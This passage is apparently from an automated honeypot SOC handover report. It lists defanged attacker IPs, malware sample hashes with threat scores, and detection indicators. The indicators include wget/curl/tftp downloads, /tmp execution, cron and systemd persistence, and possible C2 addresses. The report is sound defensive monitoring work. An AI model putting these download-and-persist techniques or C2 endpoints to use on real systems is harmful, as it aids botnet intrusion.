| `137.184.5[.]188` | **2** | 2026-09-24 17:28 | 2026-09-24 17:32 | 1m | 0 | `T1592` | 🟢 LOW |
| `218.78.64[.]229` | **2** | 2026-09-24 16:27 | 2026-09-24 16:29 | 4m | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]104` | **2** | 2026-09-24 12:56 | 2026-09-24 12:56 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]124` | **2** | 2026-09-24 13:49 | 2026-09-24 13:50 | 0m | 0 | `T1592` | 🟢 LOW |
| `84.54.73[.]213` | **2** | 2026-09-24 16:58 | 2026-09-24 16:58 | 0m | 0 | `T1592` | 🟢 LOW |
| `89.21.67[.]148` | **2** | 2026-09-24 13:46 | 2026-09-24 15:37 | 0m | 0 | `T1592` | 🟢 LOW |
| `92.118.39[.]50` | **2** | 2026-09-24 16:37 | 2026-09-24 17:11 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `101.96.205[.]145` | 1 | 2026-09-24 13:03 | 2026-09-24 13:05 | 120s | 0 | `T1592` | 🟢 LOW |
| `109.160.32[.]116` | 1 | 2026-09-24 16:44 | 2026-09-24 16:44 | 8s | 0 | `T1592` | 🟢 LOW |
| `109.160.32[.]72` | 1 | 2026-09-24 17:17 | 2026-09-24 17:17 | 8s | 0 | `T1592` | 🟢 LOW |
| `111.48.160[.]201` | 1 | 2026-09-24 16:17 | 2026-09-24 16:19 | 120s | 0 | `T1592` | 🟢 LOW |
| `114.80.39[.]74` | 1 | 2026-09-24 13:36 | 2026-09-24 13:38 | 120s | 0 | `T1592` | 🟢 LOW |
| `118.35.104[.]100` | 1 | 2026-09-24 13:02 | 2026-09-24 13:03 | 30s | 0 | `T1592` | 🟢 LOW |
| `118.47.255[.]44` | 1 | 2026-09-24 17:22 | 2026-09-24 17:22 | 21s | 0 | `T1592` | 🟢 LOW |
| `121.144.136[.]34` | 1 | 2026-09-24 16:08 | 2026-09-24 16:08 | 22s | 0 | `T1592` | 🟢 LOW |
| `121.146.210[.]142` | 1 | 2026-09-24 18:09 | 2026-09-24 18:09 | 19s | 0 | `T1592` | 🟢 LOW |
| `125.215.52[.]45` | 1 | 2026-09-24 13:03 | 2026-09-24 13:05 | 120s | 0 | `T1592` | 🟢 LOW |
| `132.148.30[.]167` | 1 | 2026-09-24 14:12 | 2026-09-24 14:13 | 13s | 0 | `T1592` | 🟢 LOW |
| `14.18.113[.]233` | 1 | 2026-09-24 14:43 | 2026-09-24 14:45 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.34.5[.]148` | 1 | 2026-09-24 18:08 | 2026-09-24 18:08 | 21s | 0 | `T1592` | 🟢 LOW |
| `14.54.123[.]123` | 1 | 2026-09-24 16:26 | 2026-09-24 16:26 | 14s | 0 | `T1592` | 🟢 LOW |
| `142.93.69[.]27` | 1 | 2026-09-24 15:52 | 2026-09-24 15:52 | 36s | 0 | `T1592` | 🟢 LOW |
| `142.93.69[.]27` | 1 | 2026-09-24 18:12 | 2026-09-24 18:12 | 3s | 0 | `T1592` | 🟢 LOW |
| `144.202.92[.]17` | 1 | 2026-09-24 16:14 | 2026-09-24 16:14 | 0s | 0 | `T1592` | 🟢 LOW |
| `175.202.194[.]227` | 1 | 2026-09-24 17:35 | 2026-09-24 17:36 | 25s | 0 | `T1592` | 🟢 LOW |
| `180.76.184[.]79` | 1 | 2026-09-24 13:34 | 2026-09-24 13:36 | 120s | 0 | `T1592` | 🟢 LOW |
| `185.223.235[.]32` | 1 | 2026-09-24 13:46 | 2026-09-24 13:46 | 0s | 0 | `T1592` | 🟢 LOW |
| `185.223.235[.]36` | 1 | 2026-09-24 15:37 | 2026-09-24 15:37 | 9s | 0 | `T1592` | 🟢 LOW |
| `192.253.248[.]251` | 1 | 2026-09-24 16:03 | 2026-09-24 16:03 | 0s | 0 | `T1592` | 🟢 LOW |
| `195.239.40[.]213` | 1 | 2026-09-24 17:37 | 2026-09-24 17:39 | 120s | 0 | `T1592` | 🟢 LOW |
| `196.218.61[.]182` | 1 | 2026-09-24 16:38 | 2026-09-24 16:40 | 120s | 0 | `T1592` | 🟢 LOW |
| `211.225.18[.]106` | 1 | 2026-09-24 13:23 | 2026-09-24 13:23 | 17s | 0 | `T1592` | 🟢 LOW |
| `217.60.77[.]62` | 1 | 2026-09-24 13:49 | 2026-09-24 13:49 | 0s | 0 | `T1592` | 🟢 LOW |
| `220.89.125[.]32` | 1 | 2026-09-24 18:11 | 2026-09-24 18:12 | 11s | 0 | `T1592` | 🟢 LOW |
| `222.103.201[.]40` | 1 | 2026-09-24 16:01 | 2026-09-24 16:02 | 31s | 0 | `T1592` | 🟢 LOW |
| `222.113.207[.]183` | 1 | 2026-09-24 16:07 | 2026-09-24 16:07 | 30s | 0 | `T1592` | 🟢 LOW |
| `3.131.220[.]121` | 1 | 2026-09-24 16:37 | 2026-09-24 16:37 | 0s | 0 | `T1592` | 🟢 LOW |
| `31.202.87[.]158` | 1 | 2026-09-24 13:02 | 2026-09-24 13:02 | 26s | 0 | `T1592` | 🟢 LOW |
| `43.128.88[.]88` | 1 | 2026-09-24 16:49 | 2026-09-24 16:49 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.156.128[.]152` | 1 | 2026-09-24 15:32 | 2026-09-24 15:32 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.156.128[.]153` | 1 | 2026-09-24 15:32 | 2026-09-24 15:32 | 5s | 0 | `T1592` | 🟢 LOW |
| `45.156.128[.]154` | 1 | 2026-09-24 15:32 | 2026-09-24 15:32 | 5s | 0 | `T1592` | 🟢 LOW |
| `45.33.109[.]18` | 1 | 2026-09-24 15:35 | 2026-09-24 15:35 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.56.79[.]53` | 1 | 2026-09-24 14:34 | 2026-09-24 14:34 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.79.115[.]59` | 1 | 2026-09-24 13:35 | 2026-09-24 13:35 | 0s | 0 | `T1592` | 🟢 LOW |
| `58.220.39[.]200` | 1 | 2026-09-24 14:49 | 2026-09-24 14:51 | 120s | 0 | `T1592` | 🟢 LOW |
| `62.60.130[.]242` | 1 | 2026-09-24 16:07 | 2026-09-24 16:07 | 0s | 0 | `T1592` | 🟢 LOW |
| `65.49.1[.]94` | 1 | 2026-09-24 13:16 | 2026-09-24 13:16 | 0s | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]203` | 1 | 2026-09-24 17:47 | 2026-09-24 17:48 | 20s | 0 | `T1592` | 🟢 LOW |
| `69.164.217[.]245` | 1 | 2026-09-24 13:35 | 2026-09-24 13:35 | 0s | 0 | `T1592` | 🟢 LOW |
| `71.90.30[.]53` | 1 | 2026-09-24 14:07 | 2026-09-24 14:07 | 45s | 0 | `T1592` | 🟢 LOW |
| `77.239.124[.]106` | 1 | 2026-09-24 15:58 | 2026-09-24 15:58 | 0s | 0 | `T1592` | 🟢 LOW |
| `77.239.124[.]130` | 1 | 2026-09-24 14:59 | 2026-09-24 14:59 | 0s | 0 | `T1592` | 🟢 LOW |
| `85.217.149[.]12` | 1 | 2026-09-24 16:53 | 2026-09-24 16:53 | 0s | 0 | `T1592` | 🟢 LOW |
| `85.217.149[.]7` | 1 | 2026-09-24 16:51 | 2026-09-24 16:51 | 0s | 0 | `T1592` | 🟢 LOW |
| `94.154.43[.]69` | 1 | 2026-09-24 15:31 | 2026-09-24 15:32 | 30s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `00deea7003eef2f30f2c84d1497a42c1f375d802ddd17bde455d5fde2a63631f` | ELF Binary (Linux executable) (x86-64 64-bit) | `00deea7003eef2f3...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **30/75** 🔴 |
| `04fcb4584d4de9deb015261bed95adfe0ac7e399503cff848908c1675e196148` | Bash Script | `04fcb4584d4de9de...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `062ba629c7b2b914b289c8da0573c179fe86f2cb1f70a31f9a1400d563c3042a` | ELF Binary (Linux executable) (x86-64 64-bit) | `062ba629c7b2b914...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `06901d0a279cc5a062c5de6903102edbcface166424935b01d984580c3d7a928` | Bash Script | `06901d0a279cc5a0...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `072cdf382cce83bc1a59d196a09b6dd1beca38a7a697f30f826633c836952442` | Bash Script | `072cdf382cce83bc...` | 57/100 | 🟡 MEDIUM | **19/75** 🔴 |
| `07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` | ELF Binary (Linux executable) (ARM 32-bit) | `07c0a0af63dde8dc...` | 86/100 | 🔴 HIGH | **40/75** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0c082e5b76630d08145c7badd020060e0ce50e333a9f28d39fe15ad6afc49d77` | Bash Script | `0c082e5b76630d08...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0cd01e621dce7d42e6d6db50ef3e16170e3b737586863ec600826c7b0d3ed423` | Unknown binary | `0cd01e621dce7d42...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `13960b7e69159907f67f84ce6398d29f73686602ef2c36d837237288f4fe8785` | Bash Script | `13960b7e69159907...` | 58/100 | 🟡 MEDIUM | **20/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 83/100 | 🔴 HIGH | **31/70** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 70/100 | 🔴 HIGH | **27/75** 🔴 |
| `1bc1c784057dc4e36fcc913fe03b1f0cae8474063b486ae3443b9ef8bced9548` | Bash Script | `1bc1c784057dc4e3...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `1bd3745a4f9043ead807d7777669b0dbf5b56985e5b3dd9d7cff8384154ea4a8` | ELF Binary (Linux executable) (x86-64 64-bit) | `1bd3745a4f9043ea...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` | Shell Script | `1d64be0ba1bd9924...` | 72/100 | 🔴 HIGH | **7/75** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 54/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 38/100 | 🟢 LOW | **21/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |

**Suspicious Indicators — HIGH Severity Samples:**

_`07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` (07c0a0af63dde8dc2e36dc58...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/bot`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.160[.]222:55487`

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

_`197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` (197c74408e15bd1168105f56...)_
- `Execution from /tmp` — `/tmp/clean_file`
- `Base64 decode (obfuscation)` — `base64 -d`
- `Cron persistence` — `crontab`

_`1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` (1d64be0ba1bd9924c3e29ae4...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Hardware recon` — `cat /proc/cpuinfo`
- `IP:Port (possible C2)` — `198.144.179[.]82:80`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `137.184.5[.]188` | US | DigitalOcean, LLC | **100** ⚠️ | 50 |
| `45.56.79[.]53` | US | Linode | **100** ⚠️ | 0 |
| `92.118.39[.]50` | RO | DMZHOST | **100** ⚠️ | 0 |
| `86.102.111[.]211` | RU | PJSC Rostelecom | **100** ⚠️ | 10 |
| `130.12.180[.]51` | NL | Virtualine Technologies | **100** ⚠️ | 50 |
| `66.132.195[.]124` | US | Censys, Inc. | **100** ⚠️ | 50 |
| `180.76.184[.]79` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 0 |
| `85.217.149[.]12` | CA | NL MODAT | **100** ⚠️ | 50 |
| `77.239.124[.]106` | NL | ROCKET & MARINICA LTD | **100** ⚠️ | 4 |
| `176.53.159[.]196` | PL | BearShield Technologies S.R.O. | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 352 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 327 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 31 |
| [T1222.002](https://attack.mitre.org/techniques/T1222/002) | 27 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 26 |

---

## 🔕 False Positive Summary (33 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 9 |
| AbuseIPDB score 19 below threshold 25 | 2 |
| AbuseIPDB score 21 below threshold 25 | 2 |
| AbuseIPDB score 5 below threshold 25 | 3 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 17 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 484 cases |
| Tool 34  | Credential Extractor        | ✅ 369 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 17 fingerprints |
| Tool 36  | Command Clustering          | ✅ 7 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 105 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 33 filtered (6.8%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 44 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 23 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 327 priority case(s) shown individually · 65 recon entry/entries in table (16 group(s) consolidating 75 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json (pipeline.yml tools) + data/tool_manifest_enriched.json (enriched_corpus.yml tools) — both auto-generated each run, together tracking all active tools across both workflows, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-09-24T19:55:24Z_
